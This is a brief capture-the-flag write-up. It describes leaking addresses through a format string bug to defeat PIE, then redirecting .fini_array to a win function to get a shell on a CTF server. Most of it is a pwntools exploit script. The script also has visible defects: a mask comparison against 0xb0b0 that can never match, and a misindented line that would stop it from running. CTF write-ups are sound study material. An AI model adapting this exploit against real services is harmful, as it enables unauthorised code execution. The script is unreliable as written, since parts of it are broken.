Because of this line got from ghidra `printf((char *)local_a8);` and because the pie was enabled for this file i was able to do 
some format string payload.
Using a lot of `%p` i was able to get the binary's adress range to trigger the win function.
Then i made a script that exploits this and got to the shell environment. Then I just used ls to find the flag and cat.

# Script: 
`from pwn import *

HOST, PORT = "ctf.ac.upt.ro", 9668
context.log_level = "info"

OFF_WIN        = 0x1380
OFF_FINI_ARRAY = 0x31c8
OFF_MAIN       = 0x10b0
OFF_EXIT_GOT   = 0x3420  

def pick_base(leaks):
    for x in leaks:
        if (x & 0xfff) == 0xb0b0:     
            return x - OFF_MAIN
    
    for x in leaks:
        if (x & 0xfff) == 0x1c8:
            return x - OFF_FINI_ARRAY
    return None

def parse_leaks(line_bytes):
    line = line_bytes.replace(b'!', b' ').split()
    leaks = []
    for t in line:
        if t.startswith(b"0x"):
            try: leaks.append(int(t, 16))
            except: pass
    return leaks

def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"name?")
    io.sendline(b"%p " * 32) 

    io.recvuntil(b"Hello, ")
    leaks = parse_leaks(io.recvline())
    base = pick_base(leaks)
    assert base, f"Couldn't find base from leaks: {leaks}"

    fini = base + OFF_FINI_ARRAY
    win  = base + OFF_WIN

    log.success(f"PIE base  = {hex(base)}")
    log.info(   f".fini_arr = {hex(fini)}")
    log.info(   f"win       = {hex(win)}")

     io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.sendline(hex(fini).encode())
    io.recvuntil(b": ")
    io.sendline(hex(win).encode())
    io.recvuntil(b"ok")

    io.recvuntil(b"> ")
    io.sendline(b"2")

 
    io.interactive()

if __name__ == "__main__":
    main()
`
